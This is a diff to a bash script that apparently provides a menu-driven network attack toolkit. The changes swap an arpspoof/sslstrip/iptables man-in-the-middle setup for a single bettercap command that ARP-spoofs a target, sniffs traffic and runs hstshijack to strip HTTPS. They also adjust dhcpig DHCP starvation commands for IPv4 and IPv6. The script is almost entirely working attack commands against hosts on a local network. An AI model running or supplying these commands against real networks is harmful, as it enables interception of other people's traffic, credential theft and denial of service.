@@ -17,9 +17,8 @@ help() {
 cleanup() {
 	echo
 	echo
-	 echo -e "\e[31m[+]\e[0m  Stopping attacks..."
-	sudo echo "0" > /proc/sys/net/ipv4/ip_forward 2>/dev/null
-	sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port 2>/dev/null
+	echo -e "\e[31m[+]\e[0m  Stopping attacks..."
+	sudo rm -f arpspoof.cap
 	pkill -f "python3 -m http.server" 2>/dev/null
 	sleep 1
 	echo
@@ -250,16 +249,6 @@ bruteforce() {
 
 
 mitmarp() {
-    cleanup_mitm(){
-        echo
-        echo -e "\e[34m[+]\e[0m  Stopping attacks..."
-        sudo echo "0" > /proc/sys/net/ipv4/ip_forward  2>/dev/null
-        sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port  2>/dev/null
-        sleep 1
-        menu
-    }
-
-    trap cleanup_mitm SIGINT
 
     while true; do
         while true; do
@@ -279,38 +268,12 @@ mitmarp() {
             fi
         done
         
-        while true; do
-            read -p "Default gateway IP: " dfg_ip
-            # regex to match ipv4 address
-            ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
-
-            if [[ $target_ip =~ $ipv4_regex ]]; then
-                break
-            else
-                echo
-                echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
-            fi
-        done
-        
-        read -p "SSLSrip listening port (default 1337): " port
-        port=${port:-1337} # set default if enter is pressed
-        
         # launch attack
         echo
-        echo -e "\e[34m[+]\e[0m  Launching attack on target $target_ip and default gateway $dfg_ip ..."
-        sudo echo "1" > /proc/sys/net/ipv4/ip_forward
-        sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
+        echo -e "\e[34m[+]\e[0m  Launching attack on target $target_ip"
+        sleep 2
         sleep 1
-        echo 
-        echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
-        sleep 2
-        xterm -title "arpspoof target to target" -geometry 80x24+0+0 -e sudo arpspoof -i $iface -t $target_ip $dfg_ip &
-        xterm -title "arpspoof target to dfg" -geometry 80x24-0+0 -e sudo arpspoof -i $iface -t $dfg_ip $target_ip &
-        sleep 2
-        xterm -title "sslstrip and sniff" -geometry 100x40+50%+50% -e sudo sslstrip -l $port -a -f &
+        sudo bettercap -iface $iface -eval "set arp.spoof.fullduplex true; set arp.spoof.target $target_ip; net.sniff on; arp.spoof on; hstshijack/hstshijack" && break
     done
     menu
 }
@@ -331,7 +294,7 @@ dhcpstarve() {
 				echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
 				sleep 2
 				echo
-				dhcpig -c -v3 -l -a -i -o $iface && break 
+				sudo dhcpig -c -v10 -l -a -i -o $iface && break 
 				;; 
 			6) # launch starvation attack on DHCP IPv6 server
 				echo
@@ -341,7 +304,7 @@ dhcpstarve() {
 				echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
 				sleep 2
 				echo
-				dhcpig -6 -c -v3 -l -i -o $iface && break
+				sudo dhcpig -6 -c -v10 -l -i -o $iface && break
 				;; 
 			*)
 				# ask again
